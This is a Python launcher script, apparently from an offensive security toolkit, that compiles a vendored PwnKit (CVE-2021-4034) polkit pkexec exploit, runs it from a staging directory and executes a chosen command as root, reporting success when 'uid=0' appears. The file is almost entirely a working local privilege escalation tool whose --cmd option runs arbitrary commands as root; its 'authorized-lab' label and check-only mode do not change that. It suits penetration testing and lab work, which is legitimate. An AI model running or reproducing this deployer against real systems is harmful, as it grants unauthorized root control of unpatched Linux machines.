#!/usr/bin/env python3
"""CVE-2021-4034 (PwnKit) - authorized-lab local privilege escalation deploy.

Compiles the vendored one-file PoC (weapons/poc/src/CVE-2021-4034/pwnkit.c,
based on the Qualys polkit pkexec technique) with cc on Linux, runs it in a
staging directory and verifies the resulting root context by executing a proof
command (default: id). On non-Linux platforms, or when cc/pkexec are absent,
the launcher returns a clean check-only result instead of firing.
"""
import argparse
import json
import os
import shutil
import subprocess
import sys
import tempfile

CVE = "CVE-2021-4034"
PAYLOAD_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(PAYLOAD_DIR))
DEFAULT_POC = os.path.join(REPO_ROOT, "weapons", "poc", "src", CVE, "pwnkit.c")


def _kernel_check():
    import platform
    return {
        "platform": sys.platform,
        "kernel": platform.release(),
        "is_linux": sys.platform.startswith("linux"),
    }


def _which_cc():
    for name in ("cc", "gcc", "clang"):
        path = shutil.which(name)
        if path:
            return path
    return None


def run(args):
    result = {
        "cve": CVE,
        "target": "local",
        "vulnerable": False,
        "verified_by": None,
        "pkexec": None,
        "poc_src": args.poc_src,
        "compiled": False,
        "output": "",
        "error": None,
    }
    result.update(_kernel_check())

    if not result["is_linux"]:
        result["error"] = "check-only: not Linux"
        return result

    if hasattr(os, "geteuid") and os.geteuid() == 0:
        result["error"] = "already root"
        result["vulnerable"] = None
        return result

    result["pkexec"] = shutil.which("pkexec") or "absent"
    cc = _which_cc()
    if cc is None:
        result["error"] = "check-only: no cc/gcc/clang on PATH"
        return result
    if not os.path.isfile(args.poc_src):
        result["error"] = "poc source missing: %s" % args.poc_src
        return result

    if args.check_only:
        result["error"] = "check-only requested"
        return result

    stage = tempfile.mkdtemp(prefix="pwnkit_")
    binary = os.path.join(stage, "pwnkit")
    try:
        r = subprocess.run(
            [cc, args.poc_src, "-o", binary, "-Wl,-e,entry", "-shared", "-fPIC"],
            capture_output=True, text=True, timeout=60,
        )
        if r.returncode != 0:
            result["error"] = "compile failed: %s" % (r.stderr or "")[:300]
            return result
        result["compiled"] = True

        # the PoC writes "GCONV_PATH=." and ".pkexec" into its cwd, so run it
        # from the staging directory; a proof command avoids needing a tty
        cmd = args.cmd or "id"
        proc = subprocess.run(
            [binary, cmd], cwd=stage, capture_output=True, text=True,
            timeout=args.timeout,
        )
        out = (proc.stdout or "") + (proc.stderr or "")
        result["output"] = out[:2000]
        result["returncode"] = proc.returncode
        if "uid=0" in out:
            result["vulnerable"] = True
            result["verified_by"] = "root context proven via %r (uid=0 in output)" % cmd
        elif "Exploit failed" in out:
            result["verified_by"] = "PoC ran; target reported patched"
        else:
            result["verified_by"] = "PoC ran; verify output manually"
        return result
    except subprocess.TimeoutExpired:
        result["error"] = "exploit run timed out after %ss" % args.timeout
        return result
    except Exception as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def main():
    p = argparse.ArgumentParser(description="CVE-2021-4034 PwnKit authorized-lab deploy")
    p.add_argument("--cmd", default=None,
                   help="command to execute as root (default: id)")
    p.add_argument("--poc-src", default=DEFAULT_POC,
                   help="path to the vendored pwnkit.c PoC")
    p.add_argument("--timeout", type=float, default=30.0, help="exploit run timeout (s)")
    p.add_argument("--check-only", action="store_true",
                   help="report environment only; do not compile/fire")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:  # defensive: deploy must never crash the operator console
        result = {"cve": CVE, "target": "local", "vulnerable": False,
                  "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    if result.get("vulnerable") is None:
        return 0
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
